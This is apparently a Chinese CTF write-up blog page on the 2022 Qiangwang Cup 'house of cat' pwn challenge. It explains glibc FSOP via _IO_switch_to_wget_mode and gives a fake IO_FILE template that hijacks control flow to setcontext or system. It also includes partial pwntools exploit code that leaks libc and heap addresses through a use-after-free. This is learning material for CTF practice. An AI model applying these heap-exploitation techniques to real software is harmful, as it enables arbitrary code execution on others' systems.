@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="2022强网杯的house of cat。高版本下UAF的直接利用。看了很多wp发现在高版本下，基本所有攻击都聚焦于FSOP方向了。看来这才是大势所趋。 注意到前几天dice_hope也有一个一模一样的题，简单做法是改libc的got表为system，也可以FSOP泄露一个栈地址来劫持返回地址。但是这道题开了沙箱，也就是只能用第二种方法了。 着重参考看雪链接-house of cat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house-of-cat">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/08/02/house-of-cat/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="2022强网杯的house of cat。高版本下UAF的直接利用。看了很多wp发现在高版本下，基本所有攻击都聚焦于FSOP方向了。看来这才是大势所趋。 注意到前几天dice_hope也有一个一模一样的题，简单做法是改libc的got表为system，也可以FSOP泄露一个栈地址来劫持返回地址。但是这道题开了沙箱，也就是只能用第二种方法了。 着重参考看雪链接-house of cat">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220802150240535.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803190420908.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803190452900.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803204441077.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803204944167.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205215090.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205116039.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205425221.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205837782.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803205954089.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803210235857.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803210429210.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803210700762.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803210723931.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803211025031.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803211921211.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803212712115.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803212846993.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803213503330.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803214011619.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803214029132.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803214112302.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803221156089.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220803221641708.png">
+<meta property="article:published_time" content="2022-08-02T03:43:12.000Z">
+<meta property="article:modified_time" content="2023-02-05T04:16:20.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="FSOP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220802150240535.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>house-of-cat | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-house-of-cat" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/08/02/house-of-cat/" class="article-date">
+      <time datetime="2022-08-02T03:43:12.000Z" itemprop="datePublished">2022-08-02</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      house-of-cat
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>2022强网杯的house of cat。高版本下UAF的直接利用。看了很多wp发现在高版本下，基本所有攻击都聚焦于FSOP方向了。看来这才是大势所趋。</p>
+<p>注意到前几天dice_hope也有一个一模一样的题，简单做法是改libc的got表为system，也可以FSOP泄露一个栈地址来劫持返回地址。但是这道题开了沙箱，也就是只能用第二种方法了。</p>
+<p>着重参考<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273895.htm#msg_header_h2_4">看雪链接-house of cat</a></p>
+<span id="more"></span>
+
+<h1 id="house-of-cat攻击手法"><a href="#house-of-cat攻击手法" class="headerlink" title="house of cat攻击手法"></a>house of cat攻击手法</h1><p>目前这种攻击手法适用于任何版本。包括最新的2.35.其利用条件为</p>
+<ol>
+<li>能够任意写一个可控地址</li>
+<li>能够泄露堆地址和libc基址</li>
+<li>能够触发IO流（FSOP或触发__malloc_assert），执行IO相关函数</li>
+</ol>
+<p>本质上来说FSOP的核心还是可控地址写一个可控数据，之后再FSOP的作用下完成调用vtable里面的函数，完成的攻击。</p>
+<p>注意vtable在glibc2.24之后就有了地址检查，也就是判断vtable整体位置。防止伪造整个vtable。这也就直接导致了house of orange在2.23之后的版本中无法使用。以下是具体的检查代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr -(<span class="type">uintptr_t</span>)__start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体看看是怎么检查的。可以看到第七行是检查当前vtable和libc的vtable开始地址之间的偏移，如果大于一个预定好的大小范围久做更细致的vtable检查。也就是说我们难以伪造整个vtable。但是对于其中的函数指针检查还是相对宽松的。因此我们可以通过改vtable中的函数指针来执行函数。</p>
+<p>我们这里修改的函数为<code>_IO_WOVERFLOW</code>。可以具体看一下它的代码和汇编代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line">  <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line">  <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"> </span><br><span class="line">  <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line">  <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这里的汇编源代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以从上面的汇编中很清楚的看到以下关键的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，在开启沙箱的情况下，假如把最后调用的[rax +  0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag；如果未开启沙箱，则只需把最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串，就可执行system(“/bin/sh”)</strong></p>
+<p>下面看一下house of cat的模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=setcontext_rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="house-of-cat题目"><a href="#house-of-cat题目" class="headerlink" title="house of cat题目"></a>house of cat题目</h1><p>这里就选择2022强网杯pwn里面的house of cat作为例子。这也是解出人数最多的一个pwn题目。</p>
+<p>首先看看这题是存在沙箱保护的。并且限制了文件描述符只能为0.</p>
+<p><img src="/.io//image-20220802150240535.png" alt="image-20220802150240535"></p>
+<p>这道题给我们的条件是可以分配大小为size &lt;= 0x417 || size &gt; 0x46F的chunk，最多分配16个，可以edit两次，并且每次只能修改30字节。free的时候<strong>存在UAF</strong>。另外还有show()函数。</p>
+<p>首先这道题需要逆一下怎么输入能够通过输入条件的检验，我比赛的时候就卡在这个地方就卡了两个小时。。。输入的结构是这样的</p>
+<blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOGIN | r00t QWB QWXFadmin</span><br><span class="line">CAT | r00t QWB QWXF$\xff</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>之后就可以类似堆题一样，做上述的四种操作。</p>
+<h2 id="step1-泄露地址"><a href="#step1-泄露地址" class="headerlink" title="step1 泄露地址"></a>step1 泄露地址</h2><p>完成上述的FSOP我们首先需要泄露堆地址和libc地址。由于UAF，这两者泄露比较容易。堆地址可以直接从largebin中拿到，而堆地址需要建立两个largebin的group，之后一并输出就能拿到一个包含下一个largebin group地址的chunk，也就能拿到堆地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">input_str1 = <span class="string">b&quot;LOGIN | r00t QWB QWXFadmin&quot;</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str1)</span><br><span class="line">input_str2 = <span class="string">b&quot;CAT | r00t QWB QWXF$\xff&quot;</span> <span class="comment"># replace admin with command</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x430</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># io.sendafter(&#x27;mew mew mew~~~~~~&#x27;,input_str2)</span></span><br><span class="line"><span class="comment"># add(0,0x420,&#x27;aaaaaaaa&#x27;)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;libc_base; &quot;</span>+ <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&#x27;d&#x27;</span>) <span class="comment"># alloc a next largebin group</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_info = u64(io.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;heap_info: &quot;</span> + <span class="built_in">hex</span>(heap_info))</span><br><span class="line">heap_base = heap_info - <span class="number">0x000290</span></span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
+
